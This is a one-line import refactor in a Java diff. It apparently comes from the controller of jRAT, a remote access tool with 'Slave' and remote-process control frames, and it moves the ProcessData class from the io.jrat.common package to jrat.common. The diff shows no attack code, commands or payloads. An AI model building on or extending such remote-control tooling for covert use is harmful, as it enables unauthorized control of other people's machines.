@@ -1,6 +1,6 @@
 package jrat.controller.packets.incoming;
 
-import io.jrat.common.ProcessData;
+import jrat.common.ProcessData;
 import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.frames.FrameRemoteProcess;
